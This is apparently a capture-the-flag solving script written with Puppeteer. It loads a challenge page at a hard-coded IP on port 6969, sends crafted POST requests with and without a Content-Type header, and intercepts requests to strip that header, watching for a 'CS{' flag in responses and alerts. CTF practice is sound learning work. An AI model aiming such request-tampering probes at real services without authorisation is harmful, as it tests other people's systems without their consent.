const puppeteer = require('puppeteer');

(async () => {
  const browser = await puppeteer.launch({ headless: true });
  const page = await browser.newPage();
  
  page.on('response', async response => {
    if (response.url().includes('6969') && response.request().method() === 'POST') {
      const text = await response.text();
      console.log('POST Response Status:', response.status());
      console.log('POST Response:', text);
      if (text.includes('CS{')) {
        console.log('*** FLAG FOUND ***');
      }
    }
  });
  
  page.on('dialog', async dialog => {
    const message = dialog.message();
    console.log('ALERT:', message);
    if (message.includes('CS{')) {
      console.log('*** FLAG FOUND ***');
    }
    await dialog.accept();
  });
  
  try {
    await page.goto('http://49.213.52.6:6969/');
    await new Promise(resolve => setTimeout(resolve, 2000));
    
    // Try fetch WITHOUT explicitly setting Content-Type
    // When you use JSON.stringify() with fetch() without Content-Type,
    // browsers might send it differently
    console.log('Trying fetch without Content-Type header...');
    const result1 = await page.evaluate(async () => {
      const res = await fetch("/", {
        method: "POST",
        // Don't set Content-Type - let browser decide
        body: JSON.stringify({ flagDaw: true }),
      });
      return {
        status: res.status,
        text: await res.text()
      };
    });
    console.log('Result 1:', result1);
    
    // Try with empty headers object
    console.log('\nTrying with empty headers...');
    const result2 = await page.evaluate(async () => {
      const res = await fetch("/", {
        method: "POST",
        headers: {},
        body: JSON.stringify({ flagDaw: true }),
      });
      return {
        status: res.status,
        text: await res.text()
      };
    });
    console.log('Result 2:', result2);
    
    // Try intercepting the request and modifying it
    await page.setRequestInterception(true);
    page.on('request', request => {
      if (request.method() === 'POST') {
        const headers = request.headers();
        // Remove Content-Type if it exists
        delete headers['content-type'];
        delete headers['Content-Type'];
        request.continue({ headers });
      } else {
        request.continue();
      }
    });
    
    // Now click the button
    console.log('\nClicking button with request interception...');
    await page.click('#button');
    await new Promise(resolve => setTimeout(resolve, 3000));
    
  } catch (error) {
    console.error('Error:', error);
  } finally {
    await browser.close();
  }
})();

